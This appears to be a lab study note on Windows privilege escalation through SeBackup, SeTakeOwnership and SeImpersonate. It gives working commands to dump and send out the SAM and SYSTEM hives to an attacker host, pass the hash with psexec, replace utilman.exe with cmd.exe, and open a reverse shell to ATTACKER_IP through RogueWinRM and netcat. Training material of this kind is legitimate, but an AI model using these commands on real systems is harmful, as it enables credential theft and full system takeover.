Each user has a set of assigned privileges that can be checked with the following command:

```cmd
whoami /priv
```

> Complete list of available privileges on Windows systems [here](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).

> [The repository](https://github.com/gtworek/Priv2Admin) shows how to exploit each privilege.

## SeBackup / SeRestore

The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.

In the following example, our user has the SeBackupPrivilege:
![[Pasted image 20251106070319.png|center]]

So we can create a copy of the system and sam registry hives:

```cmd
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

To copy the files back to our attacker machine, we can open a smb server in the attacker:

```sh
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

This will create a share name `public` pointing to the attacker's `share` directory, which requires the username and password of our current windows session. Now we can copy the registry hives:

```cmd
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

And use the `secretsdump` module to retrieve the user's password hashes:

```sh
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```

Supposing we obtain a result similar to this one:
![[Pasted image 20251106071432.png|center]]

Now we can use the administrator's hash to perform a Pass-the-Hash attack and gain access to the target computer with SYSTEM privileges, using the `psexec` module:

```sh
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP
```

## SeTakeOwnership

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys.

In order to get the SeTakeOwnership privilege, we need to open a command prompt using the "Open as administrator" option.
![[Pasted image 20251106073043.png|center]]

We'll abuse `utilman.exe` to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:
![[Pasted image 20251106073256.png|center|400]]

Utilman runs with SYSTEM privileges, so replacing the original binary with the `cmd.exe` will provide a privileged command line.

1. Take ownership of it:
```cmd
takeown /f C:\Windows\System32\Utilman.exe
```

2. Give full permissions to our user over utilman.exe
```cmd
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```

3. Replace utilman.exe with a copy of cmd.exe:
```cmd
copy cmd.exe utilman.exe
```

To trigger utilman, simply lock the screen from the start button:
![[Pasted image 20251106073706.png|center|250]]

And finally click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges:
![[Pasted image 20251106073912.png|center]]

## SeImpersonate / SeAssignPrimaryToken

These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

>[!note] Why is impersonation important?
Example: we have a FTP service running with user `ftp`. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token  rather than Ann's:
![[Pasted image 20251106084947.png]]
>
There are several reasons why using ftp's token is not the best idea: 
>- For the files to be served correctly, they would need to be accessible to the `ftp` user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user `ftp`. This adds complexity as we must manually configure specific permissions for each served file/directory. - For the operating system, all files are accessed by user `ftp`, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it. 
>- If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the `ftp` user has access.
>
>If, on the other hand, the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:
>![[89e74e14454edc10fa2bd541ac359772 1.png]]
Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files. This way, the files don't need to provide access to user `ftp` in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.

As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.

In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. Internet Information Services (IIS) will also create a similar default account called "iis apppool\defaultapppool" for web applications.

To elevate privileges using such accounts, an attacker needs the following:
1. To spawn a process so that users can connect and authenticate to it for impersonation to occur.
2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.

Example using [RogueWinRM](https://github.com/antonioCoco/RogueWinRM). Lets assume that:
1. We have already compromised a website running on IIS
2. A webshell has been planted on http://<victim_ip>/
3. The RogueWinRM binary is already in `C:\tools`

Use the webshell to check for the assigned privileges on the compromised account and confirm we hold both privileges of interest for this task:
![[Pasted image 20251106090442.png|center]]

Start the listener in the attacker's machine:
```sh
nc -lvp 4442
```

Use the webshell to trigger the RogueWinRM exploit using the following command:

```cmd
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

![[Pasted image 20251106090733.png|center]]

>[!note] 
>The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.